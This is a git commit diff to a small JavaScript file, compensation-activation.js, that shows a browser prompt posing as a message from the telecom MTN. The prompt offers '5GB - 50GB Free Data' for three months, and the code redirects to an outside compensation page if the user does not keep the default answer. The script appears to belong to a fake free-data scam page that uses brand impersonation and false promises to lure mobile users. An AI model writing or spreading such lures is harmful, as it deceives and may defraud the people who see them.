87afd776f4e4a9616e0702a223b0a05b5afaebaf
mfednewblog8 <nsikakimoh68@gmail.com>
2026-04-22 08:26:50 +0100

    Update compensation-activation.js

--- compensation-activation.js
+++ compensation-activation.js
@@ -1,5 +1,5 @@
 var password = 'ACTIVATE NOW'
-password=prompt('SMS: Because many MTN users complained that their data finishes too fast, we have a compensation data for you, press OK to activate ','ACTIVATE NOW');
+password=prompt('MTN: Get 5GB - 50GB Free Data and Browse From 4AM to 12 Midnight, Valid For 3 Months only on MTN old SIM card, press OK to activate Now','ACTIVATE NOW');
 if (password != 'ACTIVATE NOW') {
 location.href='https://ibaidad.com/compensation.html';
 }
